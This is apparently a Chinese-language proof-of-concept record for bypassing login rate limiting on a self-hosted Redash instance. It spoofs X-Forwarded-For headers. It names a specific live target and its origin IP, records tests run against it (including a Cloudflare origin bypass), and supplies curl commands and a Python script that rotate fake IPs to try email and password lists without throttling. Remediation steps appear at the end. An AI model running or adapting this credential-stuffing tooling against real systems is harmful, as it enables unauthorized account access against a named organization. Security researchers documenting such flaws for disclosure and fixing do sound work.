# Redash / Flask-Limiter 登录限速可被伪造 X-Forwarded-For 绕过（429→200，可无限口令凭据强度验证）

- **code**: redash-flask-limiter-登录限速可被伪造-x-forwarded-for-绕过-429-200-可
- **kind**: poc
- **category**: auth-bypass
- **component**: Redash（自建实例，Flask/Werkzeug + Flask-Limiter，前置 nginx/1.9.10）
- **severity**: medium
- **language**: python
- **source**: self
- **verified**: 1
- **verified_note**: finding#99（task#5，verdict=verified）在 https://redash.fanatical.com/login（源站 107.21.85.212）实测（2026-11-11 15:47–15:52 UTC，curl 8.5.0）：① 无 XFF → HTTP 429，体「50 per 1 hour」；② 加 -H "X-Forwarded-For: 181.34.186.243" → HTTP 200 登录页 <title>Login to Redash</title>；③ 带伪造 XFF 的 POST /login 正常处理并返回「Wrong email or password.」（无 429、无账号锁定）；④ 单轮 60 次不同伪造 XFF 尝试 0 次被限速；⑤ CF 绕过的源站路径（--resolve bi.fanatical.com:443:107.21.85.212，不带 XFF 时 429）加 XFF 同样 200。二分对照「无 XFF=429 / 有 XFF=200」稳定成立，判定限速键取自客户端可控 XFF、限速可被无限绕过。
- **path**: pocs/redash-flask-limiter-登录限速可被伪造-x-forwarded-for-绕过-429-200-可/poc.py
- **tags**: redash,flask-limiter,rate-limit,x-forwarded-for,nginx,login,credential-stuffing,trust-proxy,auth-bypass
- **created_at**: 2026-11-11T15:54:47.865Z
- **engine**: redash.fanatical.com (源站 107.21.85.212)

## 描述

Redash 自建实例的 /login 由 flask-limiter 做应用层限速（典型 50 次/小时/IP），但前置 nginx 未剥离 X-Forwarded-For，应用 trust proxy 直接以该客户端可控头作为限速的客户端 IP 键。验证者每次请求换一个伪造 XFF 即换一个计数桶，限速被完全绕开，可对 SSO 保护的 BI 后台做无限次口令凭据强度验证（失败无锁定）。前提：前置 nginx 不覆盖 XFF、应用 trust proxy；匿名即可触发，无需凭据。

## 用法

```
【前置条件】目标为自建 Redash（Flask/Werkzeug + flask-limiter，前置 nginx）；无需凭据。
【二分判据】同一时刻同一路径：无 XFF → HTTP 429「50 per 1 hour」；带任意伪造 XFF → HTTP 200 登录页。稳定二分即证明限速键取自客户端可控 XFF。
【步骤】
1) 基线：curl -s -o /dev/null -w '%{http_code}\n' https://TARGET/login  → 期望 429
2) 绕过：curl -s -H 'X-Forwarded-For: 101.102.103.104' https://TARGET/login  → 期望 200（<title>Login to Redash</title>）
3) 每次换随机 XFF：for i in $(seq 1 100); do ip="$((RANDOM%254+1)).$((RANDOM%254+1)).$((RANDOM%254+1)).$((RANDOM%254+1))"; ... ; done
4) POST /login 需先 GET /login 取 csrf_token 并复用同一 session cookie；登录失败判据 data-test="ErrorMessage">Wrong email or password.
【其它可用头】本目标仅 XFF 生效；X-Real-IP / Forwarded 无效。
【失败常见原因】nginx 覆盖/剥离 XFF（proxy_set_header X-Forwarded-For $remote_addr）、应用未 trust proxy、限速键还绑账号/会话/UA、目标已升级按账号或全局限速。
【修复】前置反代覆盖客户端 XFF；Redash 侧不用客户端可控头做限速键（ProxyFix 限制受信跳数）；登录失败叠加账号级锁定 + 验证码/MFA。
```

## 正文

```
# Redash /login 限速被伪造 X-Forwarded-For 绕过（429 → 200，无限口令凭据强度验证）

## 一、原理 / 前置条件
- 组件：自建 Redash（Flask/Werkzeug + flask-limiter），前置 nginx/1.9.10 反代。
- 入口：`https://<TARGET>/login`。
- 限速特征：超限返回 `HTTP 429`，体 `<h1>Too Many Requests</h1><p>50 per 1 hour</p>`。
- 根因：前置 nginx **未剥离/未覆盖 `X-Forwarded-For`**，而 Redash(Flask-Limiter) trust proxy，把客户端可控的 XFF 当作限速的客户端 IP 键。每次换一个伪造 XFF = 换一个计数桶。
- 影响：应用层限速完全失效 → 未认证者可对 SSO 保护的 BI 后台无限制做口令凭据强度验证（登录失败无账号锁定，仅回 `Wrong email or password.`）。本绕过只解除“速率”约束，不绕过密码校验本身。
- 无需任何凭据。

## 二、复现步骤（curl 8.5.0）
1) 基线：该出口 IP 已被限速
```
curl -s -o /dev/null -w '%{http_code}\n' https://TARGET/login
# → 429
# 响应体：<h1>Too Many Requests</h1><p>50 per 1 hour</p>
```
2) 伪造 XFF 绕过，拿到登录页
```
curl -s -H 'X-Forwarded-For: 181.34.186.243' https://TARGET/login
# → 200，Content-Length ~2239，<title>Login to Redash</title>（含账号口令表单）
```
3) 带伪造 XFF 的口令尝试不再受限速（先 GET 取 csrf_token + session cookie）
```
curl -s -b cj -c cj -H 'X-Forwarded-For: 181.34.186.243' \
  --data-urlencode 'email=admin@example.com' --data-urlencode 'password=Admin@123' \
  --data-urlencode 'csrf_token=<csrf>' --data 'remember=y' https://TARGET/login
# → 200，<div class="alert alert-danger" data-test="ErrorMessage">Wrong email or password.</div>
#   无 429、无账号锁定
```
4) CF 绕过的源站路径同样成立（源站直连）
```
curl -sk --noproxy '*' --resolve bi.fanatical.com:443:107.21.85.212 \
  -H 'X-Forwarded-For: 5.6.7.8' -o /dev/null -w '%{http_code}\n' \
  https://bi.fanatical.com/login      # → 200（不带 XFF 则 429）
```
5) 规模化：单轮 60 次不同伪造 XFF 的 (email,password) 尝试，**0 次被限速**。

## 三、判定要点（一句话）
`无 XFF = 429` 与 `有 XFF = 200` 的对照二分，是「限速键取自可伪造 XFF」的直接证据；
连续 POST 全程无 429 则证明限速对凭据验证完全不生效。

## 四、规模化脚本骨架
```python
#!/usr/bin/env python3
# Redash /login XFF 限速绕过 + 凭据强度验证骨架
# 适用：Flask-Limiter 应用置于不剥离 X-Forwarded-For 的 nginx 之后
import subprocess, random, re, os, tempfile

BASE = "https://TARGET"
emails = ["admin@example.com"]
pws = ["password", "admin", "changeme"]

def xip():
    return ".".join(str(random.randint(1, 254)) for _ in range(4))

def run(args):
    return subprocess.run(args, capture_output=True, text=True, timeout=30).stdout

for e in emails:
    for p in pws:
        ip = xip()
        cj = tempfile.mktemp()
        page = run(["curl", "-s", "-c", cj, "-H", "X-Forwarded-For: " + ip, BASE + "/login"])
        m = re.search(r'name="csrf_token" value="([^"]+)"', page)
        if not m:
            print("no csrf (可能仍被限速或页面结构变了；检查是否 429)"); continue
        tok = m.group(1)
        out = run(["curl", "-s", "-b", cj, "-c", cj, "-o", "/dev/null",
                   "-w", "%{http_code} %{redirect_url}",
                   "-H", "X-Forwarded-For: " + ip,
                   "--data-urlencode", "email=" + e,
                   "--data-urlencode", "password=" + p,
                   "--data-urlencode", "csrf_token=" + tok,
                   "--data", "remember=y", BASE + "/login"])
        print(e, p, out)
        os.remove(cj)
# 命中判据：HTTP 302 且 redirect_url 指向 "/"（成功登录）
```

## 五、失败时的常见原因（假阴性排查）
- 前置 nginx 覆盖/剥离 XFF（`proxy_set_header X-Forwarded-For $remote_addr;`）→ 伪造无效，仍 429。
- 应用未 trust proxy，限速键取真实 remote_addr → XFF 不生效。
- 限速键不只 IP（还绑账号/会话/UA）→ 只换 XFF 不重置计数。
- 返回 429 但附 Retry-After → 确认限速维度是否仍是 IP。
- 目标已升级 Redash，或限速实现改为按账号/全局。

## 六、修复建议
1. 前置 nginx 覆盖客户端传入的 XFF（`proxy_set_header X-Forwarded-For $remote_addr;`），仅信任边缘代理回源。
2. Redash 侧不以客户端可控头作为限速键；用 ProxyFix 限制受信代理跳数。
3. 登录失败叠加账号级锁定 + 验证码 / MFA。

## 七、实测证据
- 基线（无 XFF）：`https://redash.fanatical.com/login` → 429，体 `50 per 1 hour`。
- 绕过：加 `-H "X-Forwarded-For: 181.34.186.243"` → 200，`<title>Login to Redash</title>`（2239B）。
- POST /login（带伪造 XFF）：200 `Wrong email or password.`（无 429、无锁定）。
- CF 绕过的源站路径（`--resolve bi.fanatical.com:443:107.21.85.212`，不带 XFF 429）→ 200。
- 规模：单轮 60 次不同伪造 XFF，0 次被限速。
- 流量取证：`GET /login`(XFF) id=1794412338-3549；`POST /login`(XFF) id=1794412338-3550。

```
